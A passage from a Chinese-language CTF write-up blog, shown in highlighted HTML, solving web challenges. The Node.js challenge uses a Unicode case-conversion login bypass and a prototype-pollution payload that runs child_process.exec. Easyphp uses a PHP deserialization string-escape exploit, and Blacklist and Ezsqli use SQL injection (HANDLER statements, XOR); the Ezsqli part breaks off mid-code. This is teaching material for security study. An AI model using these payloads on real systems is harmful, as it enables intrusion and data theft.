class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(!req.session.user)&#123;<br>    res.redirect(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.outputFunctionName=<span class="hljs-literal">undefined</span>;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.session.user.user&#125;);<br>&#125;);<br><br><br>router.get(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(safeKeyword(req.body.userid))&#123;<br>    res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.session.user=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.session.user)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;<br>      req.session.user.isLogin=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router;<br></code></pre></td></tr></table></figure><p>看到了js原型链污染漏洞的标志性函数：<code>merge</code> 应该就是原型链污染了。</p><p>但是看到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215614.png" alt="image-20210417215614572"></p><p>ADMIN用户才可以触发<code>clone</code> 进而利用<code>merge</code>。但是限制了admin注册，看下注册登陆处：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215956.png" alt="image-20210417215955907"></p><p>注册处会有验证，但是后边写入session的时候会经过<code>toUpperCase()</code>函数的处理，不由得想到了nodejs的大小写转换特性：</p><blockquote><p>对于toUpperCase():</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">字符<span class="hljs-string">&quot;ı&quot;</span>、<span class="hljs-string">&quot;ſ&quot;</span> 经过<span class="hljs-keyword">to</span>UpperCase处理后结果为 <span class="hljs-string">&quot;I&quot;</span>、<span class="hljs-string">&quot;S&quot;</span><br></code></pre></td></tr></table></figure><p>对于toLowerCase():</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">字符<span class="hljs-string">&quot;K&quot;</span>经过toLowerCase处理后结果为<span class="hljs-string">&quot;k&quot;</span><span class="hljs-comment">(这个K不是K)</span><br></code></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p></blockquote><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可见我们要想得到<code>ADMIN</code> 可以注册<code>admın</code> 经过处理就得到<code>ADMIN</code>：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417220456.png" alt="image-20210417220456007"></p><p>成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在<code>outputFunctionName</code>，并且<code>res.outputFunctionName=undefined;</code>在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417225149.png" alt="image-20210417225148836"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">Content</span>-Type: application/json<br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>路径通过报错得到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224238.png" alt="image-20210417224237777"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224605.png" alt="image-20210417224604692"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224723.png" alt="image-20210417224723183"></p><p>然后访问/flag 得到flag。</p><h3 id="WEB-Easyphp"><a href="#WEB-Easyphp" class="headerlink" title="[WEB]Easyphp"></a>[WEB]Easyphp</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>扫描目录发现：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404184917405.png" alt="image-20210404184917405"></p><p>存在备份文件，下载代码审计：</p><p>admin 进入update页面 可得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185032670.png" alt="image-20210404185032670"></p><p>查看是否存在注入：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185139780.png" alt="image-20210404185139780"></p><p>存在预处理，因此无法注入</p><p>查询的sql语句为：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username=?<br></code></pre></td></tr></table></figure><p>查询admin用户的密码，密码和数据库相等则登陆成功。</p><p>通过控制执行的语句即可绕过登录admin：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username=?  <br>//<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>为<span class="hljs-number">123</span>的MD5，密码输入<span class="hljs-number">123</span>即可<br></code></pre></td></tr></table></figure><p>接下来就是利用反序列化漏洞，构造pop链去执行sql语句：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190050208.png" alt="image-20210404190050208"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">UpdateHelper类在结束时 会<span class="hljs-built_in">echo</span> 调用魔术方法<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190403536.png" alt="image-20210404190403536"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">触发<span class="hljs-keyword">User</span>的__toString()方法<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190518655.png" alt="image-20210404190518655"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">调用<span class="hljs-built_in">Info</span>的__<span class="hljs-built_in">call</span>()方法<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404191205555.png" alt="image-20210404191205555"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">__<span class="hljs-keyword">call</span> 方法调用了login<br></code></pre></td></tr></table></figure><p>这里可以：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$this</span>-&gt;CtrlCase 为dbCtrl类<br>login参数为：<span class="hljs-variable">$this</span>-&gt;age传进来的<br></code></pre></td></tr></table></figure><p>pop 链：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194116259.png" alt="image-20210404194116259"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">70</span>:<span class="hljs-string">&quot;select 1,&quot;</span><span class="hljs-number">202</span>cb<span class="hljs-number">962</span>ac<span class="hljs-number">59075</span>b<span class="hljs-number">964</span>b<span class="hljs-number">07152</span>d<span class="hljs-number">234</span>b<span class="hljs-number">70</span><span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>寻找反序列化入口：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404195102818.png" alt="image-20210404195102818"></p><p>update页面会调用update方法：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194612300.png" alt="image-20210404194612300"></p><p>可见<code>$_POST[&#39;age&#39;]</code>与<code>$_POST[&#39;nickname&#39;]</code>可控，传入Info类实例化，然后反序列化，再经过safe函数处理。</p><p>可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211512856.png" alt="image-20210404211512856"></p><p>可见是一个字符增加的字符串逃逸。</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Info()类正常序列化：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;testage&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;testname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:70:&quot;</span>select <span class="hljs-number">1</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:2:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">265</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">70</span>:<span class="hljs-string">&quot;select 1,&quot;</span><span class="hljs-number">202</span>cb<span class="hljs-number">962</span>ac<span class="hljs-number">59075</span>b<span class="hljs-number">964</span>b<span class="hljs-number">07152</span>d<span class="hljs-number">234</span>b<span class="hljs-number">70</span><span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;&#125;&#125;&#125;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:70:&quot;</span>select <span class="hljs-number">1</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:2:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>序列化一下并用safe函数处理：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">1590</span>:<span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">70</span>:<span class="hljs-string">&quot;select 1,&quot;</span><span class="hljs-number">202</span>cb<span class="hljs-number">962</span>ac<span class="hljs-number">59075</span>b<span class="hljs-number">964</span>b<span class="hljs-number">07152</span>d<span class="hljs-number">234</span>b<span class="hljs-number">70</span><span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;&#125;&#125;&#125;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211056046.png" alt="image-20210404211056046"></p><p>可见可以逃逸出来，因此payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">age=<span class="hljs-number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:70:&quot;</span>select <span class="hljs-number">1</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:2:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211250655.png" alt="image-20210404211250655"></p><p>登录页面 用户名admin 密码任意：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211322225.png" alt="image-20210404211322225"></p><h3 id="WEB-Blacklist"><a href="#WEB-Blacklist" class="headerlink" title="[WEB]Blacklist"></a>[WEB]Blacklist</h3><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先查询，发现和强网杯的很像</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124133764.png" alt="image-20210404124133764"></p><p>因此尝试堆叠注入，过滤字符：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124229017.png" alt="image-20210404124229017"></p><p>因此无法改名，也无法用预处理语句。</p><p>通过查资料 发现可以利用<code>handler</code>语句</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130143408.png" alt="image-20210404130143408"></p><p>可见flag在<code>FlagHere</code>表</p><h4 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h4><p>构造语句查一下第一行数据：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">通过<span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br> 通过<span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> FIRST获取句柄的第一行，通过<span class="hljs-keyword">READ</span> NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br> 通过<span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">CLOSE</span>来关闭打开的句柄。<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>&#x27;;handler `FlagHere` <span class="hljs-keyword">open</span>;handler `FlagHere` read first;handler `FlagHere` close;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130502802.png" alt="image-20210404130502802"></p><p>直接查到了flag。</p><h3 id="WEB-Ezsqli"><a href="#WEB-Ezsqli" class="headerlink" title="[WEB]Ezsqli"></a>[WEB]Ezsqli</h3><h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数：</p><p>发现and、or等函数都过滤了：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135430569.png" alt="image-20210404135430569"></p><p>发现<code>^</code>没有过滤，采用<code>^</code>测试注入点：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>^<span 